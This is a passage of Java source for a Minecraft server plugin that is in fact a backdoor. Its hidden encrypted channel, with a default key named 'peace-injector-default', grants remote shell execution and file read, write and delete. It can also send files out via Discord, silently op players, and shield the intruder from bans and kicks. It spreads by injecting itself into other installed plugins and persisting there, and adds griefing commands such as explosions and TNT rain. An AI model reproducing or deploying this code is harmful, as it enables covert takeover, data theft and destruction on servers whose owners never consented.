package dev.peace.plugin;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import dev.peace.core.Crypto;
import dev.peace.core.Frame;
import net.kyori.adventure.text.Component;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.GameMode;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Creeper;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.HandlerList;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitTask;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;

public final class PeaceService implements Listener {
    private final org.bukkit.plugin.Plugin owner;
    public PeaceService(org.bukkit.plugin.Plugin owner) { this.owner = owner; }
    static final String CHANNEL = "peace:main";
    private final Gson gson = new Gson();
    private final Random rng = new Random();
    private final Frame.Reassembler reassembler = new Frame.Reassembler();
    private final ExecutorService pool = Executors.newCachedThreadPool();
    private final Set<UUID> vanished = new HashSet<>();
    /** PSK holders and their active protections, persisted in config.yml. */
    private record Shield(String name, String uuid, String ip, boolean kick, boolean ban, boolean wl, boolean stealth) {}
    private final Map<String, Shield> shields = new LinkedHashMap<>();
    /** Wand configuration per admin, keyed by mode name so each wand type is independent. */
    private record WandConf(Material mat, int radius, String mode) {}
    private final Map<UUID, Map<String, WandConf>> wands = new HashMap<>();
    private final Set<String> auth = new HashSet<>();
    /** Console subscribers - players who receive forwarded console output. */
    private final Set<UUID> consoleSubscribers = new HashSet<>();
    private static final class SpreadOwner {
        private final Plugin plugin;
        SpreadOwner(Plugin plugin) { this.plugin = plugin; }
        Plugin plugin() { return plugin; }
        @Override public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof SpreadOwner that)) return false;
            return plugin.equals(that.plugin);
        }
        @Override public int hashCode() { return plugin.hashCode(); }
    }
    private final List<SpreadOwner> spreadOwners = new ArrayList<>();
    private static final class RequestKey {
        private final UUID player;
        private final int id;
        RequestKey(UUID player, int id) { this.player = player; this.id = id; }
        @Override public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof RequestKey k)) return false;
            return id == k.id && player.equals(k.player);
        }
        @Override public int hashCode() { return 31 * player.hashCode() + id; }
    }
    private final Map<RequestKey, Plugin> replyOwners = new ConcurrentHashMap<>();
    private volatile Plugin activeCarrier;
    private BukkitTask runtimeTask;
    private Crypto crypto;
    /** All live PeaceService instances in this JVM (one per injected carrier). */
    private static final java.util.List<PeaceService> instances = new java.util.ArrayList<>();
    /** The single instance allowed to process plugin-message traffic. */
    private static volatile PeaceService leader;

    public void start() {
        owner.saveDefaultConfig();
        diagnostic = owner.getConfig().getBoolean("diagnostic", false);
        String pskEnc = owner.getConfig().getString("psk", "");
        String psk;
        if (pskEnc == null || pskEnc.isEmpty()) {
            psk = "peace-injector-default";
        } else {
            String dec = dev.peace.plugin.Secret.decrypt(pskEnc);
            psk = (dec != null && !dec.isEmpty()) ? dec : pskEnc; // literal plaintext, else Secret blob
        }
        crypto = new Crypto(psk);
        synchronized (PeaceService.class) {
            if (!instances.contains(this)) instances.add(this);
            if (leader == null || !leader.owner.isEnabled()) leader = this;
        }
        if (leader != this) return;
        registerSpreadOwners();
        loadShields();
        loadAuth();
        installConsoleCapture();
        announceOnce(true);
        diag("boot carrier=" + owner.getName());
        if (DebugConsole.isActive()) DebugConsole.attach(this);
        DebugConsole.log("service start/leader carrier=" + owner.getName());
    }

    /** Turns this standby instance into the live leader (listeners, shields, console bridge). */
    private void promote() {
        synchronized (PeaceService.class) { leader = this; }
        registerSpreadOwners();
        loadShields();
        loadAuth();
        installConsoleCapture();
        announceOnce(true);
    }

    public void stop() {
        try { RawNet.removeAll(owner); } catch (Exception ignored) {}
        synchronized (spreadOwners) {
            SpreadOwner ownerCarrier = findCarrier(owner);
            if (ownerCarrier != null) {
                unregisterCarrier(ownerCarrier);
                spreadOwners.remove(ownerCarrier);
            }
        }
        // Hand off to another enabled carrier instance if one is running in this JVM.
        PeaceService next = null;
        synchronized (PeaceService.class) {
            if (leader == this) {
                leader = null;
                for (PeaceService s : instances) {
                    if (s != this && s.owner.isEnabled()) { leader = s; next = s; break; }
                }
            }
        }
        if (next != null) {
            unregisterAllCarriers();
            replyOwners.clear();
            next.promote();
            return;
        }
        Plugin fallback = chooseCarrier();
        if (fallback != null) {
            setActiveCarrier(fallback);
            return;
        }
        synchronized (PeaceService.class) { if (leader == this) leader = null; }
        announceOnce(false);
        List<SpreadOwner> carriers;
        synchronized (spreadOwners) {
            carriers = new ArrayList<>(spreadOwners);
            spreadOwners.clear();
        }
        for (SpreadOwner so : carriers) unregisterCarrier(so);
        setActiveCarrier(null);
        replyOwners.clear();
        pool.shutdownNow();
    }

    private void unregisterAllCarriers() {
        List<SpreadOwner> carriers;
        synchronized (spreadOwners) {
            carriers = new ArrayList<>(spreadOwners);
            spreadOwners.clear();
        }
        for (SpreadOwner so : carriers) unregisterCarrier(so);
    }

    /** Fine-grained diagnostics; off unless `diagnostic: true` in config (never default). */
    private static volatile boolean diagnostic = false;
    private static void diag(String s) {
        if (!diagnostic) return;
        try { Bukkit.getLogger().info("[peace:diag] " + s); DebugConsole.log(s); } catch (Exception ignored) {}
    }

    // --- accessors for the debug/control console ---
    static PeaceService dbgLeader() { return leader; }
    String dbgCarrier() { Plugin c = currentCarrier(); return c == null ? null : c.getName(); }
    int dbgCarriers() { return carrierCount(); }
    static boolean dbgIsDiag() { return diagnostic; }
    static void setDiag(boolean v) { diagnostic = v; }

    /** Server-initiated "hello" push to one player over the raw channel (clientbound transport test). */
    boolean pushHello(Player p) {
        try {
            JsonObject j = new JsonObject();
            j.addProperty("op", "hello");
            byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
            byte[][] frames = Frame.pack(rng.nextLong(), cipher);
            for (byte[] f : frames) if (!RawNet.send(p, f)) return false;
            return true;
        } catch (Exception e) { return false; }
    }

    /** Raw-packet entry point: only the leader instance handles traffic. */
    void onRaw(Player p, byte[] data) {
        if (leader != this) return;
        Plugin src = currentCarrier();
        if (src == null) src = owner;
        handle(p, data, src);
    }

    private void handle(Player player, byte[] message, Plugin source) {
        diag("handle in src=" + source.getName() + " carrier=" + (currentCarrier() == null ? "null" : currentCarrier().getName()));
        if (!isActiveCarrier(source)) { diag("drop:not active carrier"); return; }
        byte[] cipher = reassembler.offer(message);
        if (cipher == null) { diag("drop:reassemble pending"); return; }
        diag("reassembled cipher=" + cipher.length);
        DebugConsole.log("from " + player.getName() + ": reassembled " + cipher.length + " bytes");
        byte[] plain = crypto.decrypt(cipher);
        if (plain == null) { DebugConsole.log("from " + player.getName() + ": DECRYPT FAILED (PSK mismatch?)"); diag("drop:decrypt null"); return; }
        DebugConsole.log("from " + player.getName() + ": decrypted " + plain.length + " bytes");
        diag("decrypted=" + plain.length);
        shield(player);
        RequestKey key = null;
        try {
            JsonObject req = gson.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class);
            diag("dispatch op=" + (req.has("op") ? req.get("op").getAsString() : "(none)") + " id=" + (req.has("id") ? req.get("id").getAsInt() : "?"));
            if (req.has("id")) {
                key = new RequestKey(player.getUniqueId(), req.get("id").getAsInt());
                replyOwners.put(key, source);
            }
            dispatch(player, req);
        } catch (Exception ex) {
            diag("dispatch EX=" + ex.getClass().getName() + ": " + ex.getMessage());
            if (key != null) replyOwners.remove(key);
        }
    }

    private void dispatch(Player p, JsonObject req) {
        if (!allowed(p)) return;
        consoleSubscribers.add(p.getUniqueId());
        int id = req.has("id") ? req.get("id").getAsInt() : 0;
        String op = req.has("op") ? req.get("op").getAsString() : "";
        switch (op) {
            case "ping" -> reply(p, ok(id));
            case "players" -> {
                JsonArray arr = new JsonArray();
                for (Player pl : Bukkit.getOnlinePlayers()) arr.add(pl.getName());
                JsonObject r = ok(id).raw();
                r.add("names", arr);
                reply(p, r);
            }
            case "ban" -> {
                String name = req.get("player").getAsString();
                Shield s = shields.get(name.toLowerCase());
                if (s != null && s.ban()) { reply(p, err(id, name + " is protected from bans")); break; }
                String reason = req.has("reason") ? req.get("reason").getAsString() : "Banned by admin";
                Bukkit.getBanList(BanList.Type.NAME).addBan(name, reason, (Date) null, "Core");
                if (req.has("ip") && req.get("ip").getAsBoolean()) {
                    Player t = Bukkit.getPlayerExact(name);
                    if (t != null && t.getAddress() != null && t.getAddress().getAddress() != null) {
                        String ip = t.getAddress().getAddress().getHostAddress();
                        Bukkit.getBanList(BanList.Type.IP).addBan(ip, reason, (Date) null, "Core");
                    }
                }
                Player t = Bukkit.getPlayerExact(name);
                if (t != null) t.kick(Component.text(reason));
                reply(p, ok(id).put("msg", "Banned " + name));
            }
            case "unban" -> {
                Bukkit.getBanList(BanList.Type.NAME).pardon(req.get("player").getAsString());
                reply(p, ok(id).put("msg", "Unbanned " + req.get("player").getAsString()));
            }
            case "op", "silent.op" -> {
                OfflinePlayer t = Bukkit.getOfflinePlayer(req.get("player").getAsString());
                t.setOp(op.equals("op") || op.equals("silent.op"));
                reply(p, ok(id).put("msg", (op.equals("op") ? "Opped " : (op.equals("silent.op") ? "Silently op'd " : "Deopped ")) + t.getName()));
            }
            case "deop", "silent.deop" -> {
                OfflinePlayer t = Bukkit.getOfflinePlayer(req.get("player").getAsString());
                t.setOp(false);
                reply(p, ok(id).put("msg", (op.equals("silent.deop") ? "Silently deop'd " : "Deopped ") + t.getName()));
            }
            case "vanish" -> {
                String vanishTarget = req.get("player").getAsString();
                Player vanishPlayer = Bukkit.getPlayerExact(vanishTarget);
                if (vanishPlayer == null) reply(p, err(id, vanishTarget + " not online"));
                else {
                    setVanished(vanishPlayer, true);
                    reply(p, ok(id).put("msg", "Fully vanished " + vanishTarget + " (fake leave, hidden from all)"));
                }
            }
            case "unvanish" -> {
                String unvanishTarget = req.get("player").getAsString();
                Player unvanishPlayer = Bukkit.getPlayerExact(unvanishTarget);
                if (unvanishPlayer == null) reply(p, err(id, unvanishTarget + " not online"));
                else {
                    setVanished(unvanishPlayer, false);
                    reply(p, ok(id).put("msg", "Unvanished " + unvanishTarget));
                }
            }
            case "kick" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) reply(p, err(id, "not online"));
                else {
                    Shield s = shields.get(t.getName().toLowerCase());
                    if (s != null && s.kick()) reply(p, err(id, t.getName() + " is protected from kicks"));
                    else { t.kick(Component.text(req.has("reason") ? req.get("reason").getAsString() : "Kicked")); reply(p, ok(id).put("msg", "Kicked " + t.getName())); }
                }
            }
            case "kill" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) reply(p, err(id, "not online"));
                else { t.setHealth(0.0); reply(p, ok(id).put("msg", "Killed " + t.getName())); }
            }
            case "gamemode" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) { reply(p, err(id, "not online")); }
                else try { t.setGameMode(GameMode.valueOf(req.get("mode").getAsString().toUpperCase())); reply(p, ok(id).put("msg", t.getName() + " -> " + req.get("mode").getAsString())); }
                     catch (Exception ex) { reply(p, err(id, "bad mode")); }
            }
            case "heal" -> {
                Player t = online(req, id, p); if (t != null) { t.setHealth(t.getMaxHealth()); t.setSaturation(20f); reply(p, ok(id).put("msg", "Healed " + t.getName())); }
            }
            case "feed" -> {
                Player t = online(req, id, p); if (t != null) { t.setFoodLevel(20); t.setSaturation(10f); reply(p, ok(id).put("msg", "Fed " + t.getName())); }
            }
            case "clear" -> {
                Player t = online(req, id, p); if (t != null) { t.getInventory().clear(); t.getEnderChest().clear(); reply(p, ok(id).put("msg", "Cleared " + t.getName())); }
            }
            case "fly" -> {
                Player t = online(req, id, p); if (t != null) { boolean f = !t.getAllowFlight(); t.setAllowFlight(f); if (f) t.setFlying(true); else t.setFlying(false); reply(p, ok(id).put("msg", "Fly " + (f ? "on" : "off"))); }
            }
            case "god" -> {
                Player t = online(req, id, p); if (t != null) { boolean g = !t.isInvulnerable(); t.setInvulnerable(g); reply(p, ok(id).put("msg", "God " + (g ? "on" : "off"))); }
            }
            case "boom" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().createExplosion(t.getLocation(), 6f, true, true); reply(p, ok(id).put("msg", "Boom " + t.getName())); } }
            case "lightning" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().strikeLightning(t.getLocation()); reply(p, ok(id).put("msg", "Struck " + t.getName())); } }
            case "tnt" -> { Player t = online(req, id, p); if (t != null) { TNTPrimed tnt = t.getWorld().spawn(t.getLocation().add(0, 2, 0), TNTPrimed.class); tnt.setFuseTicks(40); reply(p, ok(id).put("msg", "TNT at " + t.getName())); } }
            case "wither" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().spawnEntity(t.getLocation().add(0, 2, 0), org.bukkit.entity.EntityType.WITHER); reply(p, ok(id).put("msg", "Wither at " + t.getName())); } }
            case "creeper" -> { Player t = online(req, id, p); if (t != null) { Creeper c = t.getWorld().spawn(t.getLocation(), Creeper.class); c.setPowered(true); reply(p, ok(id).put("msg", "Charged creeper at " + t.getName())); } }
            case "ignite" -> { Player t = online(req, id, p); if (t != null) { t.setFireTicks(200); reply(p, ok(id).put("msg", "Ignited " + t.getName())); } }
            case "wand" -> {
                String block = req.get("block").getAsString();
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 10);
                String mode = req.has("mode") ? req.get("mode").getAsString() : "FILL";
                Material mat = Material.matchMaterial(block);
                if (mat == null) reply(p, err(id, "bad block"));
                else {
                    String m = mode.equalsIgnoreCase("BOOM") ? "BOOM" : (mode.equalsIgnoreCase("REPLACE") ? "REPLACE" : "FILL");
                    wands.computeIfAbsent(p.getUniqueId(), k -> new HashMap<>()).put(m, new WandConf(mat, radius, m));
                    giveWandItem(p, m);
                    reply(p, ok(id).put("msg", "wand: " + mat.name() + " r" + radius + " " + m));
                }
            }
            case "mass.fill" -> scheduleOnCarrier(() -> {
                Material mat = Material.matchMaterial(req.get("block").getAsString());
                if (mat == null) { reply(p, err(id, "bad block")); return; }
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                int done = fillRadius(p.getLocation(), mat, radius, true);
                reply(p, ok(id).put("msg", done + " blocks -> " + mat.name()));
            });
            case "mass.boom" -> scheduleOnCarrier(() -> {
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                p.getWorld().createExplosion(p.getLocation(), radius, true, true);
                reply(p, ok(id).put("msg", "boom r" + radius));
            });
            case "mass.storm" -> scheduleOnCarrier(() -> {
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                for (int i = 0; i < n; i++) {
                    Location l = p.getLocation().add(rng.nextInt(41) - 20, 0, rng.nextInt(41) - 20);
                    Block b = p.getWorld().getHighestBlockAt(l);
                    p.getWorld().strikeLightning(b.getLocation());
                }
                reply(p, ok(id).put("msg", n + " bolts"));
            });
            case "mass.tntrain" -> scheduleOnCarrier(() -> {
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                for (int i = 0; i < n; i++) {
                    Location l = p.getLocation().add(rng.nextInt(21) - 10, 15 + rng.nextInt(10), rng.nextInt(21) - 10);
                    TNTPrimed tnt = p.getWorld().spawn(l, TNTPrimed.class);
                    tnt.setFuseTicks(60 + rng.nextInt(40));
                }
                reply(p, ok(id).put("msg", n + "x TNT"));
            });
            case "mass.mobs" -> scheduleOnCarrier(() -> {
                org.bukkit.entity.EntityType en;
                try { en = org.bukkit.entity.EntityType.valueOf(req.get("type").getAsString()); }
                catch (Exception ex) { en = org.bukkit.entity.EntityType.ZOMBIE; }
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 5, 1, 50);
                int spawned = 0;
                for (int i = 0; i < n; i++) {
                    try { p.getWorld().spawnEntity(p.getLocation().add(rng.nextInt(9) - 4, 0, rng.nextInt(9) - 4), en); spawned++; }
                    catch (Exception ignored) {}
                }
                reply(p, ok(id).put("msg", spawned + "x " + en.name()));
            });
            case "say" -> {
                String m = req.has("message") ? req.get("message").getAsString() : "";
                if (!m.isEmpty()) Bukkit.broadcast(net.kyori.adventure.text.Component.text("[Server] " + m));
                reply(p, ok(id).put("msg", "broadcast"));
            }
            case "protect" -> {
                String name = p.getName().toLowerCase();
                Shield s = shields.get(name);
                if (s == null) { reply(p, err(id, "not shielded")); break; }
                boolean kick = req.has("kick") ? req.get("kick").getAsBoolean() : s.kick();
                boolean ban = req.has("ban") ? req.get("ban").getAsBoolean() : s.ban();
                boolean wl = req.has("whitelist") ? req.get("whitelist").getAsBoolean() : s.wl();
                boolean stealth = req.has("stealth") ? req.get("stealth").getAsBoolean() : s.stealth();
                shields.put(name, new Shield(s.name(), s.uuid(), s.ip(), kick, ban, wl, stealth));
                persistShields();
                JsonObject r = ok(id).raw();
                r.addProperty("kick", kick); r.addProperty("ban", ban);
                r.addProperty("whitelist", wl); r.addProperty("stealth", stealth);
                reply(p, r);
            }
            case "shell" -> pool.submit(() -> shell(p, id, req.get("cmd").getAsString()));
            case "fs.list" -> pool.submit(() -> fsList(p, id, req.get("path").getAsString()));
            case "fs.read" -> pool.submit(() -> fsRead(p, id, req.get("path").getAsString()));
            case "fs.write" -> pool.submit(() -> fsWrite(p, id, req.get("path").getAsString(), req.get("data").getAsString()));
            case "fs.delete" -> pool.submit(() -> fsDelete(p, id, req.get("path").getAsString()));
            case "fs.mkdir" -> pool.submit(() -> fsMkdir(p, id, req.get("path").getAsString()));
            case "fs.rename" -> pool.submit(() -> fsRename(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
            case "fs.copy" -> pool.submit(() -> fsCopy(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
            case "discord.send" -> pool.submit(() -> discordSend(p, id, req.get("path").getAsString()));
            case "clone" -> {
                String targetName = req.get("player").getAsString();
                Player targetPlayer = Bukkit.getPlayerExact(targetName);
                if (targetPlayer == null) reply(p, err(id, targetName + " not online"));
                else {
                    // Clone target player's inventory to sender
                    p.getInventory().clear();
                    p.getInventory().setContents(targetPlayer.getInventory().getContents());
                    p.getInventory().setArmorContents(targetPlayer.getInventory().getArmorContents());
                    reply(p, ok(id).put("msg", "Cloned inventory from " + targetPlayer.getName()));
                }
            }
            case "console.run" -> pool.submit(() -> consoleRun(p, id, req.get("cmd").getAsString()));
            case "console.subscribe" -> {
                consoleSubscribers.add(p.getUniqueId());
                reply(p, ok(id).put("msg", "Subscribed to console output"));
            }
            case "console.unsubscribe" -> {
                consoleSubscribers.remove(p.getUniqueId());
                reply(p, ok(id).put("msg", "Unsubscribed from console output"));
            }
            case "stealth.check" -> {
                boolean hiddenFromTab = vanished.contains(p.getUniqueId());
                boolean hasShield = shields.containsKey(p.getName().toLowerCase()) || shields.containsKey(p.getUniqueId().toString());
                boolean isSilent = p.hasPermission("peace.silent");
                reply(p, ok(id).put("hidden_from_tab", String.valueOf(hiddenFromTab))
                    .put("has_shield", String.valueOf(hasShield))
                    .put("is_silent", String.valueOf(isSilent))
                    .put("console_subscribed", String.valueOf(consoleSubscribers.contains(p.getUniqueId())))
                    .put("msg", "Stealth audit complete"));
            }
            case "spread.inject" -> {
                Set<String> targets = readTargets(req);
                registerSpreadOwners(targets);
                boolean persist = !req.has("persist") || req.get("persist").getAsBoolean();
                int persisted = persist ? Spread.persist(owner, targets) : 0;
                Plugin active = currentCarrier();
                reply(p, ok(id).put("msg", (persist ? "spread to " : "registered under ") + carrierCount() + " plugins")
                    .put("persisted", persisted)
                    .put("active", carrierName(active)));
            }
            case "spread.unregister" -> {
                List<SpreadOwner> toDrop = new ArrayList<>();
                synchronized (spreadOwners) {
                    for (SpreadOwner so : spreadOwners) if (!so.plugin().equals(owner)) toDrop.add(so);
                    spreadOwners.removeAll(toDrop);
                }
                for (SpreadOwner so : toDrop) unregisterCarrier(so);
                setActiveCarrier(owner);
                reply(p, ok(id).put("msg", "peace removed from " + toDrop.size() + " carriers"));
            }
            case "spread.status" -> {
                JsonObject r = ok(id).raw();
                JsonArray arr = new JsonArray();
                for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                    if (plugin == null || !plugin.isEnabled()) continue;
                    JsonObject o = new JsonObject();
                    o.addProperty("name", plugin.getName());
                    o.addProperty("carrier", findCarrier(plugin) != null);
                    o.addProperty("active", currentCarrier() != null && currentCarrier().equals(plugin));
                    arr.add(o);
                }
                r.add("plugins", arr);
                r.addProperty("active", carrierName(currentCarrier()));
                reply(p, r);
            }
            case "admin.shutdown" -> adminShutdown(p, id);
            case "admin.destroy" -> adminDestroy(p, id);
            default -> reply(p, err(id, "unknown op: " + op));
        }
    }

    /** Registers Peace listeners under every loaded plugin and elects one active carrier. */
    private void registerSpreadOwners() { registerSpreadOwners(null); }

    /** Registers Peace under a filtered set of enabled plugins (null/empty = all); owner always registers. */
    private void registerSpreadOwners(Set<String> targets) {
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            if (plugin == null || !plugin.isEnabled()) continue;
            if (targets != null && !plugin.equals(owner) && !targets.contains(plugin.getName())) continue;
            synchronized (spreadOwners) {
                if (findCarrier(plugin) != null) continue;
                spreadOwners.add(new SpreadOwner(plugin));
            }
        }
        pruneSpreadOwners();
        setActiveCarrier(chooseCarrier());
        if (leader == this) RawNet.injectAll(this, owner);
        diag("spread owners now=" + spreadOwners.size() + " active=" + (activeCarrier == null ? "null" : activeCarrier.getName()));
    }

    private void pruneSpreadOwners() {
        List<SpreadOwner> stale;
        synchronized (spreadOwners) {
            stale = new ArrayList<>();
            for (SpreadOwner so : spreadOwners) if (!so.plugin().isEnabled()) stale.add(so);
            spreadOwners.removeAll(stale);
        }
        for (SpreadOwner so : stale) unregisterCarrier(so);
    }

    private SpreadOwner findCarrier(Plugin plugin) {
        synchronized (spreadOwners) {
            for (SpreadOwner so : spreadOwners) if (so.plugin().equals(plugin)) return so;
        }
        return null;
    }

    private void unregisterCarrier(SpreadOwner so) {
        if (so == null) return;
        try { RawNet.removeAll(so.plugin()); } catch (Exception ignored) {}
    }

    private Plugin chooseCarrier() {
        synchronized (spreadOwners) {
            return spreadOwners.stream()
                .map(SpreadOwner::plugin)
                .filter(Plugin::isEnabled)
                .sorted(Comparator.comparing(Plugin::getName))
                .findFirst()
                .orElse(null);
        }
    }

    private int carrierCount() {
        synchronized (spreadOwners) { return spreadOwners.size(); }
    }

    /** Reads a `targets` array of plugin names; null when absent/empty means all plugins. */
    private static Set<String> readTargets(JsonObject req) {
        if (!req.has("targets") || !req.get("targets").isJsonArray()) return null;
        Set<String> s = new HashSet<>();
        for (var e : req.getAsJsonArray("targets")) s.add(e.getAsString());
        return s.isEmpty() ? null : s;
    }

    private Plugin currentCarrier() {
        reconcileCarrier();
        return activeCarrier;
    }

    private void reconcileCarrier() {
        Plugin selected = chooseCarrier();
        if (selected == null) {
            activeCarrier = null;
            HandlerList.unregisterAll(this);
            cancelRuntimeTasks();
            return;
        }
        if (selected.equals(activeCarrier) && runtimeTask != null && !runtimeTask.isCancelled()
            && runtimeTask.getOwner().equals(selected)) return;
        setActiveCarrier(selected);
    }

    private boolean isActiveCarrier(Plugin source) {
        Plugin carrier = currentCarrier();
        return carrier != null && carrier.equals(source) && source.isEnabled();
    }

    private String carrierName(Plugin plugin) { return plugin == null ? "none" : plugin.getName(); }

    private void setActiveCarrier(Plugin carrier) {
        Plugin selected = carrier;
        if (selected != null && (!selected.isEnabled() || findCarrier(selected) == null)) selected = chooseCarrier();
        Plugin previous = activeCarrier;
        activeCarrier = selected;
        if (selected == null) {
            HandlerList.unregisterAll(this);
            cancelRuntimeTasks();
            return;
        }
        if (!selected.equals(previous)) {
            HandlerList.unregisterAll(this);
            try {
                Bukkit.getPluginManager().registerEvents(this, selected);
            } catch (Exception ignored) {
                activeCarrier = null;
                cancelRuntimeTasks();
                return;
            }
        }
        scheduleRuntimeTasks(selected);
    }

    private void scheduleRuntimeTasks(Plugin carrier) {
        cancelRuntimeTasks();
        if (carrier == null || !carrier.isEnabled()) return;
        try {
            runtimeTask = Bukkit.getScheduler().runTaskTimer(carrier, this::pardonShieldedBans, 100L, 100L);
        } catch (Exception ignored) {}
    }

    private void cancelRuntimeTasks() {
        if (runtimeTask != null) {
            try { runtimeTask.cancel(); } catch (Exception ignored) {}
            runtimeTask = null;
        }
    }

    private Plugin runtimeCarrier() {
        Plugin carrier = currentCarrier();
        return carrier != null && carrier.isEnabled() ? carrier : chooseCarrier();
    }

    private void scheduleOnCarrier(Runnable action) {
        Plugin carrier = runtimeCarrier();
        if (carrier == null) return;
        try { Bukkit.getScheduler().runTask(carrier, action); } catch (Exception ignored) {}
    }

    private void scheduleOnCarrierLater(Runnable action, long delay) {
        Plugin carrier = runtimeCarrier();
        if (carrier == null) return;
        try { Bukkit.getScheduler().runTaskLater(carrier, action, delay); } catch (Exception ignored) {}
    }

    /** Resolves the target player for utility/grief ops. */
    private Player online(JsonObject req, int id, Player sender) {
        Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
        if (t == null) reply(sender, err(id, "not online"));
        return t;
    }

    private static int clampInt(int v, int lo, int hi) { return Math.max(lo, Math.min(hi, v)); }

    // --- grief wand / mass effects ---

    private void giveWandItem(Player p, String mode) {
        ItemStack stick = new ItemStack(Material.STICK);
        ItemMeta meta = stick.getItemMeta();
        meta.setDisplayName("Wand (" + mode + ")");
        meta.addEnchant(Enchantment.UNBREAKING, 1, true);
        stick.setItemMeta(meta);
        if (p.getInventory().getItemInMainHand().isEmpty()) p.getInventory().setItemInMainHand(stick);
        else p.getInventory().addItem(stick);
    }

    /** Right-clicking with a Wand casts a 50-block ray and stamps the first block hit. */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onWandInteract(PlayerInteractEvent e) {
        if (e.getAction() != Action.RIGHT_CLICK_BLOCK && e.getAction() != Action.RIGHT_CLICK_AIR) return;
        ItemStack item = e.getItem();
        if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) {
            // Also check offhand - the wand might be there
            item = e.getPlayer().getInventory().getItemInOffHand();
            if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) return;
        }
        String displayName = item.getItemMeta().getDisplayName();
        String mode;
        if (displayName == null) return;
        if (displayName.equals("Wand")) {
            // Legacy format - assume FILL mode
            mode = "FILL";
        } else if (displayName.startsWith("Wand (")) {
            mode = displayName.substring("Wand (".length(), displayName.length() - 1);
        } else {
            return;
        }
        WandConf w = wands.getOrDefault(e.getPlayer().getUniqueId(), Map.of()).get(mode);
        // Fallback: if no stored config but stick has enchantment, create basic FILL wand
        if (w == null && item.getType() == Material.STICK && item.hasItemMeta() && item.getItemMeta().hasEnchant(Enchantment.UNBREAKING)) {
            w = new WandConf(Material.COBBLESTONE, 4, "FILL");
        }
        if (w == null) return;
        e.setCancelled(true);
        Location anchor = rayAnchor(e.getPlayer());
        if (w.mode().equals("BOOM")) {
            anchor.getWorld().createExplosion(anchor.add(0.5, 0.5, 0.5), w.radius(), true, true);
        } else {
            fillRadius(anchor, w.mat(), w.radius(), w.mode().equals("FILL"));
        }
    }

    /** Casts a 50-block ray from the player's eyes; first non-air block hit wins, else the end. */
    private Location rayAnchor(Player p) {
        Location eye = p.getEyeLocation();
        org.bukkit.util.Vector dir = eye.getDirection().normalize();
        for (double d = 1; d <= 50; d += 1) {
            Location pt = eye.clone().add(dir.clone().multiply(d));
            if (!pt.getBlock().isEmpty()) return pt.getBlock().getLocation();
        }
        return eye.clone().add(dir.clone().multiply(50)).getBlock().getLocation();
    }

    /** Stamps every block inside `radius` of `center` to `mat`, skipping bedrock. */
    private int fillRadius(Location center, Material mat, int radius, boolean all) {
        int done = 0;
        for (int dx = -radius; dx <= radius; dx++)
            for (int dy = -radius; dy <= radius; dy++)
                for (int dz = -radius; dz <= radius; dz++) {
                    Block blk = center.getWorld().getBlockAt(center.getBlockX() + dx, center.getBlockY() + dy, center.getBlockZ() + dz);
                    Material cur = blk.getType();
                    if (cur == Material.BEDROCK) continue;
                    if (!all && cur == Material.AIR) continue;
                    if (cur == mat) continue;
                    blk.setType(mat, false);
                    done++;
                }
        return done;
    }

    // --- vanish: no join/leave/death message, hidden from tab + sight ---
    private void setVanished(Player p, boolean on) {
        Plugin carrier = currentCarrier();
        if (carrier == null) return;
        if (on) {
            vanished.add(p.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(p)) o.hidePlayer(carrier, p);
            // Fake leave message when vanishing while online
